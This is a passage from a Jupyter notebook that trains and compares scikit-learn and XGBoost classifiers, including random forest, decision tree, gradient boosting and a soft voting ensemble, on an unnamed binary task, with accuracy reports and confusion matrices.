    "from sklearn.ensemble import RandomForestClassifier\n",
    "rfc = RandomForestClassifier(n_estimators=1500, random_state=0, max_features=8)\n",
    "rfc.fit(X_train, y_train)\n",
    "rfc_pred = rfc.predict(X_val)\n",
    "print(metrics.accuracy_score(y_val, rfc_pred))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 141,
   "id": "41dae317",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "              precision    recall  f1-score   support\n",
      "\n",
      "           0       0.99      0.99      0.99      5320\n",
      "           1       0.99      0.99      0.99      5309\n",
      "\n",
      "    accuracy                           0.99     10629\n",
      "   macro avg       0.99      0.99      0.99     10629\n",
      "weighted avg       0.99      0.99      0.99     10629\n",
      "\n"
     ]
    }
   ],
   "source": [
    "report = classification_report(y_val, rfc_pred)\n",
    "print(report)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 142,
   "id": "0e6247e5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Axes: >"
      ]
     },
     "execution_count": 142,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 600x400 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "con_mat = confusion_matrix(y_val, rfc_pred)\n",
    "f, ax = plt.subplots(figsize=(6, 4))\n",
    "sns.heatmap(con_mat, annot=True, fmt='g',cmap=\"YlGnBu\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2d2bbb6a",
   "metadata": {},
   "source": [
    "### Decision tree"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "id": "32e88c86",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0.9840060212625835\n"
     ]
    }
   ],
   "source": [
    "from sklearn.tree import DecisionTreeClassifier\n",
    "dtc = DecisionTreeClassifier(random_state=0)\n",
    "dtc.fit(X_train, y_train)\n",
    "dtc_pred = dtc.predict(X_val)\n",
    "print(metrics.accuracy_score(y_val, dtc_pred))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 113,
   "id": "89ce529b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "              precision    recall  f1-score   support\n",
      "\n",
      "           0       0.98      0.99      0.98      5320\n",
      "           1       0.99      0.98      0.98      5309\n",
      "\n",
      "    accuracy                           0.98     10629\n",
      "   macro avg       0.98      0.98      0.98     10629\n",
      "weighted avg       0.98      0.98      0.98     10629\n",
      "\n"
     ]
    }
   ],
   "source": [
    "report = classification_report(y_val, dtc_pred)\n",
    "print(report)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "097c5e14",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "id": "e7964571",
   "metadata": {},
   "source": [
    "## Ensemble learning"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fb32da62",
   "metadata": {},
   "source": [
    "### Gradient Boosting Regressor"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 114,
   "id": "eda4cd28",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Gradient Boosting Regressor score:  94.6528029919907\n"
     ]
    }
   ],
   "source": [
    "from sklearn.ensemble import GradientBoostingRegressor\n",
    "gbrt = GradientBoostingRegressor(max_depth=17, n_estimators=130)\n",
    "gbrt.fit(X_train, y_train)\n",
    "print(\"Gradient Boosting Regressor score: \", gbrt.score(X_val, y_val)*100)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d398233b",
   "metadata": {},
   "source": [
    "### xgboost"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 115,
   "id": "f1fd4032",
   "metadata": {},
   "outputs": [],
   "source": [
    "# !pip install xgboost"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "id": "860fdef7",
   "metadata": {},
   "outputs": [],
   "source": [
    "import xgboost\n",
    "xgb_clf = xgboost.XGBClassifier(n_estimators=4500, eval_metric='mlogloss')\n",
    "xgb_clf.fit(X_train, y_train)\n",
    "xgb_pred = xgb_clf.predict(X_val)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 117,
   "id": "e88ad116",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "xgboost score:  98.94627904788786\n"
     ]
    }
   ],
   "source": [
    "print(\"xgboost score: \", xgb_clf.score(X_val, y_val)*100)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "id": "9c09a042",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "              precision    recall  f1-score   support\n",
      "\n",
      "           0       0.99      0.99      0.99      5320\n",
      "           1       0.99      0.99      0.99      5309\n",
      "\n",
      "    accuracy                           0.99     10629\n",
      "   macro avg       0.99      0.99      0.99     10629\n",
      "weighted avg       0.99      0.99      0.99     10629\n",
      "\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 600x400 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "con_mat = confusion_matrix(y_val, xgb_pred)\n",
    "f, ax = plt.subplots(figsize=(6, 4))\n",
    "sns.heatmap(con_mat, annot=True, fmt='g',cmap=\"YlGnBu\")\n",
    "print(classification_report(y_val, xgb_pred))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6c655fa2",
   "metadata": {},
   "source": [
    "### AdaBoost"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "id": "d743e4b4",
   "metadata": {},
   "outputs": [],
   "source": [
    "# from sklearn.ensemble import AdaBoostClassifier\n",
    "# adac = AdaBoostClassifier(\n",
    "# #     DecisionTreeClassifier(random_state=0),\n",
    "#     RandomForestClassifier(random_state=0),\n",
    "#     n_estimators=500,\n",
    "#     algorithm=\"SAMME.R\")\n",
    "\n",
    "# adac.fit(X_train, y_train)\n",
    "# adac_pred = adac.predict(X_val)\n",
    "# print(\"AdaBoost Classifier score: \", adac.score(X_val, y_val)*100)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "id": "c332dc62",
   "metadata": {},
   "outputs": [],
   "source": [
    "# con_mat = confusion_matrix(y_val, adac_pred)\n",
    "# f, ax = plt.subplots(figsize=(6, 4))\n",
    "# sns.heatmap(con_mat, annot=True, fmt='g',cmap=\"YlGnBu\")\n",
    "# print(classification_report(y_val, adac_pred))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d363dc54",
   "metadata": {},
   "source": [
    "### Voting"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "id": "8e7457e8",
   "metadata": {},
   "outputs": [],
   "source": [
    "classifiers = [('Decision Tree', dtc),\n",
    "               ('KNN', knn),\n",
    "               ('Gaussian Naive Bayes', gnb),             \n",
    "               ('Random Forest', rfc)]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "id": "50807311",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Decision Tree accuracy: 98.40060212625835\n",
      "KNN accuracy: 96.02032176121931\n",
      "Gaussian Naive Bayes accuracy: 87.06369366826607\n",
      "Random Forest accuracy: 99.06858594411516\n"
     ]
    }
   ],
   "source": [
    "# for c_name, c in classifiers:\n",
    "#     c.fit(X_train, y_train)\n",
    "#     preds = c.predict(X_val)\n",
    "#     print(f'{c_name} accuracy: {accuracy_score(y_val, preds)*100}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 123,
   "id": "91cef6fd",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.ensemble import VotingClassifier\n",
    "soft_VC = VotingClassifier(estimators=classifiers, voting='soft')\n",
    "soft_VC.fit(X_train, y_train)\n",
    "soft_pred = soft_VC.predict(X_val)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "id": "d4109948",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Voting Classifier score: 98.62639947313953\n"
     ]
    }
   ],
   "source": [
    "soft_vc = accuracy_score(y_val, soft_pred)*100\n",
    "print(f'Voting Classifier score: {soft_vc}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f9d5476f",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e12ee348",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "id": "5b77cc87",
   "metadata": {},
   "source": [
    "# Predictions using test data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2428bc4c",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
